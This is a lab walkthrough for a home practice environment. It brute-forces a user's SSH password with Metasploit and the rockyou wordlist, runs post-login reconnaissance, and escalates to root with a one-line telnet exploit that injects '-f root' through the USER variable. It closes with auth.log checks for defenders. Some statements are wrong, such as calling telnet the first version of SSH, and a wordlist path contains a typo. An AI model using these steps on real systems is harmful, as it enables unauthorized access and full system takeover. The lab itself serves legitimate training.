# SSH Brute Force Lab
This lab Takes step 2 and 3 of the cyber kill chain, Weaponization. In this lab we will be attempting to use a tool to brute force the SSH service of our target linux server with the target of bob. Based on OSINT we know this individual has been breached in the past and we can get their password likely in the rockyou database.

We will also talk preventions here since I'm very oriented to the blue team side of cybersecurity, and this is a great time to talk ratelimiting

---
## Required Materials
- Setup lab


---
1. Login and access the kali linux machine

2. Prepare the wordlist
To ensure this lab goes quicky. I have prepared a wordlist already that is located in this github with title "passlist" use this by copying it over to your kali workstation. We will use this to brute force as its a more targeted wordlist

We are going to create the directory and track our items in a new directory to help with logging.
```sh
mkdir -p ~/labs/ssh-brute
cd ~/labs/ssh-brute
# We will use this in case we wish to log any parts of our attack.
```

3. See the help menu for metasploit console
Metaspolit is a very common tool with easy explots that allow you to attack a target. We will be using it's ability to brute force 

```sh
msfconsole
search ssh
use auxiliary/scanner/ssh/ssh_login 
show options
set RHOST <Target IP>
set PASS_FILE /use/share/wordlists/rockyou.txt
set USERNAME bob

# Ensure options are set
show options
```
Congrats! You are now done with the "Weaponization" chain of the cyber kill chain, as you can see you went and started getting your tools together prior to running. Lets Execute our attack!

```sh
# Executing the attack
run
```

If you recieved the password of the bob account, lets try to login with the account!

```sh
ssh bob@<target>
```
Now we have access to the operating system!

4. Exploring our access
As an attacker, now that we have access to a system we will need to explore and learn our environment.

```sh
sudo -l # do we have root perms?
uname -a # vulnerable kernel?
ps -aux # Services?
history # Any command history?
crontab -l # Scheduled jobs?
```

Telnet is running. Hm whats the version?
```sh
telnet -V
```

6. Privilege Escalation special
As you might have observed in recon, the telnet version 2.5 `telnet -V` is actually vulnerable to a new exploit [CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061). This exploit allows for, well trivial privilege escalation.

Telnet is the first version of SSH. It was developed several years ago prior to the infrastucture of public keys we have today. Meaning the traffic that is sent to and from the web server is actually able to be sniffed and located by an attacker. Some servers still use it however, and this is why this vulnerability is so extreme.

While logged in as bob type:
```sh
USER="-f root" telnet -a localhost
```
This is practically the equivilent of walking into a bank saying "Hey I work here, just give me all the money" and walking out with the entire bank vault. You instantly are dropped into the most privileged account on the system.

**Ending note - Finding the SSH Brute force**
If you want to see this from a blue team perspective. I recomend looking here:
```sh
# /var/log/auth.log shows authentication attempts for a user. use these commands to help look around:
less /var/log/auth.log | grep ssh
cat /var/log/auth.log | grep ACCEPTED
cat /var/log/auth.log | grep DENIED
```
You will see anything from SSH, to telnet, to any kind of login open on a system. This will help in an incident response in trying to figure out what happend to a system. We will talk further about IR later in our project.

---
## Conclusion
You have succesfully run an attack on a system, brute forcing your way in.
